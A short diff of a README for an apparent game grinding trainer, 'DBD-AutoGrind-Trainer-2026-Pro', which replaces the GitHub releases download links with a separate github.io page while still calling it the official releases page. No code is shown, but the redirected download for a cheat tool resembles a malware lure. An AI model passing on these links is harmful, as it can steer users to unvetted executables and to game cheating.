@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate your character progression with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Britishwestafricahedgefund788/DBD-AutoGrind-Trainer-2026-Pro/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://britishwestafricahedgefund788.github.io)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Downloading the Tool
 
-1.  Visit the official [releases page](https://github.com/Britishwestafricahedgefund788/DBD-AutoGrind-Trainer-2026-Pro/releases) to find the latest version.
+1.  Visit the official [releases page](https://britishwestafricahedgefund788.github.io) to find the latest version.
 2.  Locate the most recent release entry at the top of the list.
 3.  Click the blue link to download the zip file to your computer.
 4.  Once the download finishes, move the file to a folder of your choice.
